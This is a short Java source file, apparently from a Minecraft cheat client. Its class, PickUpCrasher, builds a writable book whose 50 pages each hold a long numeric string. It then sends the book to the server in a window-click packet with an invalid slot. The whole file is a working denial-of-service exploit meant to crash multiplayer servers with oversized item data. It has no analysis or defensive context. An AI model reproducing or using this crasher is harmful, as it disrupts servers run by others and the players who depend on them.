public class PickUpCrasher {
   public static void start() {
      Minecraft mc = Minecraft.getMinecraft();
      Minecraft.getMinecraft().player.connection.sendPacket(new CPacketClickWindow(0, -999, 0, ClickType.PICKUP, bigBook(), (short)0));
   }

   public static ItemStack bigBook() {
      ItemStack itemStack = new ItemStack(Items.WRITABLE_BOOK);
      NBTTagCompound bookCompound = new NBTTagCompound();
      Minecraft.getMinecraft();
      String author = Minecraft.getSession().getUsername();
      String title = "Play with me.";
      String size = "4567238567845678945678956782984567890187456789024567815467894067345739374632493246348465438436542376452386453645234763254872345324897245672385678456789456789567829845678901874567890245678154678940673457393746324932463484654384365423764523864536452347632548723453248972456723856784567894567895678298456789018745678902456781546789406734573937463249324634846543843654237645238645364523476325487234532489724567238567845678945678956782984567890187456789024567815467894067345739374632493246348465438436542376452386453645234763254872345324897245672385678456789456789567829845678901874567890245678154678940673457393746324932463484654384365423764523864536452347632548723453248972";
      bookCompound.setString("author", author);
      bookCompound.setString("title", title);
      NBTTagList pageList = new NBTTagList();
      String pageText = size;

      for(int page = 0; page < 50; ++page) {
         pageList.appendTag(new NBTTagString(pageText));
      }

      bookCompound.setTag("pages", pageList);
      itemStack.setTagCompound(bookCompound);
      return itemStack;
   }
}
